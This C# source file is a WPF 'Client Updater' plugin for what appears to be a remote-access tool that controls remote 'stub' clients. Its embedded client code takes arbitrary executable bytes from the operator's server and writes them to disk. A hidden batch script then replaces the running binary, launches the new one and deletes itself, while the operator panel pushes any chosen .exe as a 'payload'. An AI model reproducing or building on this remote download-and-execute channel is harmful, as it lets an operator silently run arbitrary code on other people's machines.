#nullable disable

using System;
using System.Collections.Concurrent;
using System.IO;
using System.Runtime.Versioning;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using WpfApp.Plugins;

namespace WpfApp.Plugins.Builtin.UpdatePlugin
{
    [SupportedOSPlatform("windows")]
    public class UpdatePlugin : IServerPlugin
    {
        private PluginHost _host;
        private readonly ConcurrentDictionary<string, UpdatePluginUI> _clientUIs = new();

        public string PluginId => "update";
        public string DisplayName => "Client Updater";
        public string Version => "1.0.0";
        public string Description => "Updates clients by replacing the stub and launching a new executable.";

        public Task Initialize(PluginHost host)
        {
            _host = host;
            return Task.CompletedTask;
        }

        public Task Shutdown()
        {
            foreach (var ui in _clientUIs.Values)
                ui.Dispose();
            _clientUIs.Clear();
            return Task.CompletedTask;
        }

        public string GetClientCode()
        {
            return @"
using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace ClientPlugin_update
{
    public class Main
    {
        private Func<byte[], Task> _send;

        public async Task Run(Func<byte[], Task> sendData, Func<Task<byte[]>> receiveData)
        {
            _send = sendData;

            // Send ready signal
            await _send(new byte[] { 0xFE });

            try
            {
                while (true)
                {
                    byte[] data = await receiveData();
                    if (data == null || data.Length == 0) break;

                    byte cmd = data[0];
                    switch (cmd)
                    {
                        case 0x01: // Receive new executable payload
                            await HandleUpdate(data);
                            break;
                    }
                }
            }
            catch (Exception ex)
            {
                byte[] errBytes = Encoding.UTF8.GetBytes(ex.Message);
                byte[] msg = new byte[errBytes.Length + 1];
                msg[0] = 0x03; // error
                Buffer.BlockCopy(errBytes, 0, msg, 1, errBytes.Length);
                _ = _send(msg);
            }
        }

        private async Task HandleUpdate(byte[] data)
        {
            if (data.Length < 2)
            {
                await SendStatus(0x03, ""No payload received."");
                return;
            }

            try
            {
                byte[] exeBytes = new byte[data.Length - 1];
                Buffer.BlockCopy(data, 1, exeBytes, 0, exeBytes.Length);

                // Write to a temp file
                string currentExe = Process.GetCurrentProcess().MainModule.FileName;
                string directory = Path.GetDirectoryName(currentExe);
                string tempPath = Path.Combine(directory, ""_update_"" + Guid.NewGuid().ToString(""N"").Substring(0, 8) + "".exe"");

                File.WriteAllBytes(tempPath, exeBytes);

                await SendStatus(0x02, ""Update file written: "" + tempPath);

                // Create a batch script that waits for us to exit, replaces the exe, and launches the new one
                string batchPath = Path.Combine(directory, ""_update.bat"");
                string batchContent = string.Format(
                    ""@echo off\r\n"" +
                    ""timeout /t 2 /nobreak >nul\r\n"" +
                    ""del \""{0}\""\r\n"" +
                    ""move \""{1}\""  \""{0}\""\r\n"" +
                    ""start \""\""  \""{0}\""\r\n"" +
                    ""del \""%~f0\""\r\n"",
                    currentExe, tempPath);

                File.WriteAllText(batchPath, batchContent);

                var psi = new ProcessStartInfo
                {
                    FileName = batchPath,
                    CreateNoWindow = true,
                    UseShellExecute = false,
                    WindowStyle = ProcessWindowStyle.Hidden
                };
                Process.Start(psi);

                await SendStatus(0x01, ""Update initiated. Client will restart."");

                // Exit current process
                Environment.Exit(0);
            }
            catch (Exception ex)
            {
                _ = SendStatus(0x03, ""Update failed: "" + ex.Message);
            }
        }

        private async Task SendStatus(byte code, string message)
        {
            byte[] textBytes = Encoding.UTF8.GetBytes(message);
            byte[] msg = new byte[textBytes.Length + 1];
            msg[0] = code;
            Buffer.BlockCopy(textBytes, 0, msg, 1, textBytes.Length);
            try { await _send(msg); } catch { }
        }
    }
}
";
        }

        public UserControl CreateUI(PluginContext context)
        {
            var ui = new UpdatePluginUI(context);
            _clientUIs[context.ClientId] = ui;
            return ui;
        }

        public Task OnClientDataReceived(string clientId, byte[] data)
        {
            if (data == null || data.Length == 0) return Task.CompletedTask;

            if (_clientUIs.TryGetValue(clientId, out var ui))
            {
                byte messageType = data[0];
                string text = data.Length > 1 ? Encoding.UTF8.GetString(data, 1, data.Length - 1) : "";

                switch (messageType)
                {
                    case 0xFE:
                        ui.OnClientReady();
                        break;
                    case 0x01: // Update initiated successfully
                        ui.AppendLog($"[SUCCESS] {text}\n", UpdatePluginUI.SuccessColorValue);
                        ui.SetBusy(false);
                        break;
                    case 0x02: // Status/info message
                        ui.AppendLog($"[INFO] {text}\n", UpdatePluginUI.TextSecondaryColorValue);
                        break;
                    case 0x03: // Error
                        ui.AppendLog($"[ERROR] {text}\n", UpdatePluginUI.DangerColorValue);
                        ui.SetBusy(false);
                        break;
                }
            }

            return Task.CompletedTask;
        }

        public Task OnClientDisconnected(string clientId)
        {
            if (_clientUIs.TryRemove(clientId, out var ui))
            {
                ui.AppendLog("\n[Client disconnected]\n", UpdatePluginUI.DangerColorValue);
                ui.SetBusy(false);
                ui.Dispose();
            }
            return Task.CompletedTask;
        }

        public void Dispose()
        {
            foreach (var ui in _clientUIs.Values)
                ui.Dispose();
            _clientUIs.Clear();
        }
    }

    [SupportedOSPlatform("windows")]
    public class UpdatePluginUI : UserControl, IDisposable
    {
        private static Color C(string key) => (Color)Application.Current.Resources[key];
        private static SolidColorBrush B(string key) => (SolidColorBrush)Application.Current.Resources[key];

        // Theme colors from resources
        private static Color BackgroundColor => C("BackgroundColor");
        private static Color SurfaceColor => C("SurfaceColor");
        private static Color SurfaceLightColor => C("SurfaceLightColor");
        private static Color BorderColor => C("BorderColor");
        private static Color TextPrimaryColor => C("TextPrimaryColor");
        private static Color TextSecondaryColor => C("TextSecondaryColor");
        private static Color PrimaryColor => C("PrimaryColor");
        private static Color PrimaryHoverColor => C("PrimaryHoverColor");
        private static Color DangerColor => C("DangerColor");
        private static Color SuccessColor => C("SuccessColor");
        private static Color DisabledBgColor => C("ButtonBgColor");
        private static Color DisabledFgColor => C("TextSecondaryColor");

        // Expose for the plugin to use
        public static Color SuccessColorValue => SuccessColor;
        public static Color DangerColorValue => DangerColor;
        public static Color TextSecondaryColorValue => TextSecondaryColor;

        private static readonly SolidColorBrush BackgroundBrush = new(BackgroundColor);
        private static readonly SolidColorBrush SurfaceBrush = new(SurfaceColor);
        private static readonly SolidColorBrush BorderBrushColor = new(BorderColor);
        private static readonly SolidColorBrush TextPrimaryBrush = new(TextPrimaryColor);
        private static readonly SolidColorBrush TextSecondaryBrush = new(TextSecondaryColor);
        private static readonly SolidColorBrush DisabledBgBrush = new(DisabledBgColor);

        private readonly PluginContext _context;
        private readonly RichTextBox _logBox;
        private readonly FlowDocument _document;
        private readonly TextBox _filePathBox;
        private readonly Button _browseButton;
        private readonly Button _updateButton;
        private readonly TextBlock _statusLabel;
        private bool _clientReady;
        private bool _busy;

        public UpdatePluginUI(PluginContext context)
        {
            _context = context;

            var grid = new Grid();
            grid.RowDefinitions.Add(new RowDefinition { Height = new GridLength(1, GridUnitType.Auto) });  // toolbar
            grid.RowDefinitions.Add(new RowDefinition { Height = new GridLength(1, GridUnitType.Auto) });  // file picker
            grid.RowDefinitions.Add(new RowDefinition { Height = new GridLength(1, GridUnitType.Star) });  // log output

            // -- Row 0: Toolbar / Status --
            var toolbar = new Border
            {
                Background = SurfaceBrush,
                BorderBrush = BorderBrushColor,
                BorderThickness = new Thickness(0, 0, 0, 1),
                Padding = new Thickness(8, 6, 8, 6)
            };

            var toolbarPanel = new StackPanel { Orientation = Orientation.Horizontal };

            _statusLabel = new TextBlock
            {
                Text = $"Update — {TruncateId(context.ClientId)} — Waiting for client...",
                Foreground = TextSecondaryBrush,
                VerticalAlignment = VerticalAlignment.Center,
                FontSize = 12
            };

            toolbarPanel.Children.Add(_statusLabel);
            toolbar.Child = toolbarPanel;
            Grid.SetRow(toolbar, 0);
            grid.Children.Add(toolbar);

            // -- Row 1: File picker + Update button --
            var pickerBorder = new Border
            {
                Background = SurfaceBrush,
                BorderBrush = BorderBrushColor,
                BorderThickness = new Thickness(0, 0, 0, 1),
                Padding = new Thickness(8, 8, 8, 8)
            };

            var pickerPanel = new DockPanel();

            _updateButton = CreateThemedButton("? Update", PrimaryColor, PrimaryHoverColor);
            _updateButton.IsEnabled = false;
            _updateButton.Click += UpdateButton_Click;
            _updateButton.Margin = new Thickness(6, 0, 0, 0);
            DockPanel.SetDock(_updateButton, Dock.Right);

            _browseButton = CreateThemedButton("Browse…", SurfaceLightColor, C("ButtonBgHoverColor"));
            _browseButton.Click += BrowseButton_Click;
            _browseButton.Margin = new Thickness(6, 0, 0, 0);
            DockPanel.SetDock(_browseButton, Dock.Right);

            _filePathBox = new TextBox
            {
                Background = BackgroundBrush,
                Foreground = TextPrimaryBrush,
                FontFamily = new FontFamily("Cascadia Mono, Consolas, 'Courier New', monospace"),
                FontSize = 13,
                BorderThickness = new Thickness(1),
                BorderBrush = BorderBrushColor,
                Padding = new Thickness(8, 5, 8, 5),
                CaretBrush = TextPrimaryBrush,
                VerticalContentAlignment = VerticalAlignment.Center,
                IsReadOnly = true,
                Style = null
            };

            pickerPanel.Children.Add(_updateButton);
            pickerPanel.Children.Add(_browseButton);
            pickerPanel.Children.Add(_filePathBox);
            pickerBorder.Child = pickerPanel;
            Grid.SetRow(pickerBorder, 1);
            grid.Children.Add(pickerBorder);

            // -- Row 2: Log output --
            _document = new FlowDocument
            {
                Background = BackgroundBrush,
                Foreground = new SolidColorBrush(TextPrimaryColor),
                FontFamily = new FontFamily("Cascadia Mono, Consolas, 'Courier New', monospace"),
                FontSize = 13,
                PagePadding = new Thickness(12)
            };

            _logBox = new RichTextBox
            {
                Document = _document,
                IsReadOnly = true,
                Background = BackgroundBrush,
                Foreground = new SolidColorBrush(TextPrimaryColor),
                FontFamily = new FontFamily("Cascadia Mono, Consolas, 'Courier New', monospace"),
                FontSize = 13,
                BorderThickness = new Thickness(0),
                VerticalScrollBarVisibility = ScrollBarVisibility.Auto,
                HorizontalScrollBarVisibility = ScrollBarVisibility.Disabled,
                Padding = new Thickness(0)
            };
            Grid.SetRow(_logBox, 2);
            grid.Children.Add(_logBox);

            this.Content = grid;
            this.Background = BackgroundBrush;
        }

        private static Button CreateThemedButton(string text, Color normalBg, Color hoverBg)
        {
            var normalBgBrush = new SolidColorBrush(normalBg);
            var hoverBgBrush = new SolidColorBrush(hoverBg);

            var template = new ControlTemplate(typeof(Button));

            var borderFactory = new FrameworkElementFactory(typeof(Border));
            borderFactory.Name = "btnBorder";
            borderFactory.SetValue(Border.BackgroundProperty, normalBgBrush);
            borderFactory.SetValue(Border.BorderBrushProperty, new SolidColorBrush(C("ButtonBorderColor")));
            borderFactory.SetValue(Border.BorderThicknessProperty, new Thickness(1));
            borderFactory.SetValue(Border.CornerRadiusProperty, new CornerRadius(3));
            borderFactory.SetValue(Border.PaddingProperty, new Thickness(8, 4, 8, 4));
            borderFactory.SetValue(Border.SnapsToDevicePixelsProperty, true);

            var contentFactory = new FrameworkElementFactory(typeof(ContentPresenter));
            contentFactory.Name = "btnContent";
            contentFactory.SetValue(ContentPresenter.HorizontalAlignmentProperty, HorizontalAlignment.Center);
            contentFactory.SetValue(ContentPresenter.VerticalAlignmentProperty, VerticalAlignment.Center);
            borderFactory.AppendChild(contentFactory);

            template.VisualTree = borderFactory;

            var hoverTrigger = new Trigger { Property = UIElement.IsMouseOverProperty, Value = true };
            hoverTrigger.Setters.Add(new Setter(Border.BackgroundProperty, hoverBgBrush, "btnBorder"));
            template.Triggers.Add(hoverTrigger);

            var pressedTrigger = new Trigger { Property = System.Windows.Controls.Primitives.ButtonBase.IsPressedProperty, Value = true };
            pressedTrigger.Setters.Add(new Setter(Border.BackgroundProperty, hoverBgBrush, "btnBorder"));
            pressedTrigger.Setters.Add(new Setter(Border.OpacityProperty, 0.8, "btnBorder"));
            template.Triggers.Add(pressedTrigger);

            var disabledTrigger = new Trigger { Property = UIElement.IsEnabledProperty, Value = false };
            disabledTrigger.Setters.Add(new Setter(Border.BackgroundProperty, new SolidColorBrush(DisabledBgColor), "btnBorder"));
            disabledTrigger.Setters.Add(new Setter(ContentPresenter.OpacityProperty, 0.4, "btnContent"));
            template.Triggers.Add(disabledTrigger);

            return new Button
            {
                Content = text,
                Template = template,
                Foreground = new SolidColorBrush(TextPrimaryColor),
                Cursor = Cursors.Hand,
                Margin = new Thickness(2),
                FontSize = 12,
                FontWeight = FontWeights.SemiBold
            };
        }

        private static string TruncateId(string id)
        {
            if (string.IsNullOrEmpty(id)) return "";
            return id.Length <= 16 ? id : id.Substring(0, 16) + "…";
        }

        public void OnClientReady()
        {
            Dispatcher.BeginInvoke(() =>
            {
                _clientReady = true;
                _statusLabel.Text = $"Update — {TruncateId(_context.ClientId)} — Ready";
                _statusLabel.Foreground = new SolidColorBrush(SuccessColor);
                UpdateButtonState();
                AppendLog("[Client plugin ready. Select an executable and click 'Update'.]\n", SuccessColor);
            });
        }

        private void BrowseButton_Click(object sender, RoutedEventArgs e)
        {
            var dialog = new Microsoft.Win32.OpenFileDialog
            {
                Filter = "Executable Files (*.exe)|*.exe|All Files (*.*)|*.*",
                Title = "Select New Client Executable"
            };

            if (dialog.ShowDialog() == true)
            {
                _filePathBox.Text = dialog.FileName;
                UpdateButtonState();
            }
        }

        private async void UpdateButton_Click(object sender, RoutedEventArgs e)
        {
            if (!_clientReady || _busy) return;

            string filePath = _filePathBox.Text;
            if (string.IsNullOrWhiteSpace(filePath) || !File.Exists(filePath))
            {
                AppendLog("[ERROR] File not found or no file selected.\n", DangerColor);
                return;
            }

            try
            {
                SetBusy(true);
                AppendLog($"[INFO] Reading file: {filePath}\n", TextSecondaryColor);

                byte[] exeBytes = await Task.Run(() => File.ReadAllBytes(filePath));

                AppendLog($"[INFO] Sending update payload ({exeBytes.Length:N0} bytes)...\n", TextSecondaryColor);

                // Build message: [0x01 (update command)] [exe bytes]
                byte[] msg = new byte[exeBytes.Length + 1];
                msg[0] = 0x01;
                Buffer.BlockCopy(exeBytes, 0, msg, 1, exeBytes.Length);

                await _context.SendToClient(msg);

                AppendLog("[INFO] Payload sent. Waiting for client response...\n", TextSecondaryColor);
            }
            catch (Exception ex)
            {
                AppendLog($"[ERROR] Failed to send update: {ex.Message}\n", DangerColor);
                SetBusy(false);
            }
        }

        private void UpdateButtonState()
        {
            Dispatcher.BeginInvoke(() =>
            {
                _updateButton.IsEnabled = _clientReady && !_busy && !string.IsNullOrWhiteSpace(_filePathBox.Text);
            });
        }

        public void SetBusy(bool busy)
        {
            Dispatcher.BeginInvoke(() =>
            {
                _busy = busy;
                _browseButton.IsEnabled = !busy;
                UpdateButtonState();

                if (busy)
                {
                    _statusLabel.Text = $"Update — {TruncateId(_context.ClientId)} — Sending...";
                    _statusLabel.Foreground = new SolidColorBrush(C("WarningColor"));
                }
                else if (_clientReady)
                {
                    _statusLabel.Text = $"Update — {TruncateId(_context.ClientId)} — Ready";
                    _statusLabel.Foreground = new SolidColorBrush(SuccessColor);
                }
            });
        }

        public void AppendLog(string text, Color? color = null)
        {
            Dispatcher.BeginInvoke(() =>
            {
                var paragraph = _document.Blocks.LastBlock as Paragraph;
                if (paragraph == null)
                {
                    paragraph = new Paragraph { Margin = new Thickness(0) };
                    _document.Blocks.Add(paragraph);
                }

                var run = new Run(text);
                if (color.HasValue)
                {
                    run.Foreground = new SolidColorBrush(color.Value);
                }

                paragraph.Inlines.Add(run);
                _logBox.ScrollToEnd();

                while (_document.Blocks.Count > 500)
                {
                    _document.Blocks.Remove(_document.Blocks.FirstBlock);
                }
            });
        }

        public void Dispose()
        {
        }
    }
}